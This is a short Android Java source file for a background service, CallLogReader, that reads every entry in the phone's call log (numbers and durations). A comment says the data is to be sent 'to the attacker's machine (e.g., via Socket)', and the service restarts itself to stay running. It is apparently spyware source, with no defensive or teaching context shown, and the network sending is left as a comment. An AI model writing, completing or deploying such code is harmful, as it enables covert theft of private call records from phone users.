package com.example.myapp;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.CallLog;

public class CallLogReader extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        Cursor cursor = getContentResolver().query(callLogUri, null, null, null, null);

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                // Send this data to the attacker's machine (e.g., via Socket)
            }
            cursor.close();
        }

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
